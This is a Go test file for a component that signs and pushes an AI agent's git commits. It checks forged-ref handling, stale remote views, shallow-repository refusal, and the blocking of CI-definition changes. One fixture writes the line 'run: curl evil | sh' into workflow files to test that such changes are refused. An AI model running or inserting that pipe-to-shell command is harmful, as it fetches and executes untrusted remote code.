package gitpush

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// linkedFixture is a remote, the operator's repository cloned from it, and
// a linked worktree of that repository on a new branch "new/1" (absent at
// the remote): the paseo layout, whose common dir the agent's git writes.
type linkedFixture struct {
	fixture
	repo, headDir string
}

func newLinked(t *testing.T) linkedFixture {
	t.Helper()
	f := newFixture(t)
	l := linkedFixture{fixture: f, repo: f.base}
	l.ws = filepath.Join(filepath.Dir(f.ws), "linked")
	run(t, l.repo, "git", "worktree", "add", "-q", "-b", "new/1", l.ws, "origin/main")
	l.headDir = filepath.Join(l.repo, ".git", "worktrees", "linked")
	return l
}

func (l linkedFixture) req() Request {
	r := l.fixture.req()
	r.Workspace, r.HeadDir, r.Branch = l.ws, l.headDir, "new/1"
	return r
}

// A forged remote-tracking ref in the shared git dir (the agent writes
// refs/) claims the agent's commits are pushed already: conductor signs
// them anyway — what is pushed is learnt from the remote, never from local
// refs.
func TestLinkedPushSignsCommitsAForgedRemoteRefClaims(t *testing.T) {
	l := newLinked(t)
	base := run(t, l.repo, "git", "rev-parse", "origin/main")
	l.commit(t, "b.txt", "b\n")
	head := l.commit(t, "c.txt", "c\n")
	run(t, l.repo, "git", "update-ref", "refs/remotes/origin/forged", head)
	res, err := Push(context.Background(), l.req())
	if err != nil {
		t.Fatal(err)
	}
	if res.Commits != 2 || !res.Signed {
		t.Fatalf("both agent commits are signed despite the forged ref: %+v", res)
	}
	l.verifyRange(t, base, run(t, l.remote, "git", "rev-parse", "new/1"))
}

// The local view is stale (the remote's main moved on, its other branches
// are gone): the remote's tips are fetched to learn what is pushed, so the
// shared history is not re-signed as the agent's.
func TestLinkedPushFetchesTipsWhenTheLocalViewIsStale(t *testing.T) {
	l := newLinked(t)
	other := filepath.Join(filepath.Dir(l.ws), "other")
	run(t, filepath.Dir(other), "git", "clone", "-q", l.remote, other)
	os.WriteFile(filepath.Join(other, "m.txt"), []byte("m\n"), 0o644)
	run(t, other, "git", "add", ".")
	run(t, other, "git", "commit", "-q", "-m", "main moves on")
	run(t, other, "git", "push", "-q", "origin", "main", ":fix/1", ":other")
	l.commit(t, "b.txt", "b\n")
	res, err := Push(context.Background(), l.req())
	if err != nil {
		t.Fatal(err)
	}
	if res.Commits != 1 {
		t.Fatalf("only the agent's commit is new: %+v", res)
	}
}

func TestPushRefusesAShallowTrustedDir(t *testing.T) {
	l := newLinked(t)
	l.commit(t, "b.txt", "b\n")
	seed := run(t, l.repo, "git", "rev-parse", "origin/main")
	os.WriteFile(filepath.Join(l.repo, ".git", "shallow"), []byte(seed+"\n"), 0o644)
	if _, err := Push(context.Background(), l.req()); err == nil || !strings.Contains(err.Error(), "shallow") {
		t.Fatalf("a shallow trusted dir is refused: %v", err)
	}
}

func TestPushRefusesCIChangesUnlessAllowed(t *testing.T) {
	for _, p := range []string{".github/workflows/ci.yml", ".gitlab-ci.yml", ".circleci/config.yml", "Jenkinsfile", ".github/actions/x/action.yml"} {
		f := newFixture(t)
		before := run(t, f.remote, "git", "rev-parse", "fix/1")
		os.MkdirAll(filepath.Join(f.ws, filepath.Dir(p)), 0o755)
		f.commit(t, p, "run: curl evil | sh\n")
		f.commit(t, "after.txt", "x\n")
		_, err := Push(context.Background(), f.req())
		if !errors.Is(err, ErrCIChange) || !strings.Contains(err.Error(), p) {
			t.Fatalf("%s: a CI definition change is refused: %v", p, err)
		}
		if run(t, f.remote, "git", "rev-parse", "fix/1") != before {
			t.Fatalf("%s: nothing pushed", p)
		}
		r := f.req()
		r.AllowCIChanges = true
		if _, err := Push(context.Background(), r); err != nil {
			t.Fatalf("%s: allow_ci_changes lets it through: %v", p, err)
		}
	}
	// Not CI: a path that only looks like one.
	for _, p := range []string{"docs/.github/workflows/x.yml", ".github/CODEOWNERS", "Jenkinsfile.md"} {
		if IsCIPath(p) {
			t.Errorf("%s is not a CI definition", p)
		}
	}
}

// Merging a branch that already carries a CI change is not the agent's
// change: only what a merge itself alters against every parent counts.
func TestPushAllowsAMergeBringingCIChangesIn(t *testing.T) {
	f := newFixture(t)
	other := filepath.Join(filepath.Dir(f.ws), "human")
	run(t, filepath.Dir(other), "git", "clone", "-q", f.remote, other)
	os.MkdirAll(filepath.Join(other, ".github", "workflows"), 0o755)
	os.WriteFile(filepath.Join(other, ".github", "workflows", "ci.yml"), []byte("on: push\n"), 0o644)
	run(t, other, "git", "add", ".")
	run(t, other, "git", "commit", "-q", "-m", "human CI change")
	run(t, other, "git", "push", "-q", "origin", "main")
	run(t, f.base, "git", "fetch", "-q", "origin")
	f.commit(t, "b.txt", "b\n")
	run(t, f.ws, "git", "fetch", "-q", f.remote, "main")
	run(t, f.ws, "git", "merge", "-q", "--no-edit", "FETCH_HEAD")
	if _, err := Push(context.Background(), f.req()); err != nil {
		t.Fatalf("a merge of main's own CI change is not the agent's: %v", err)
	}
}
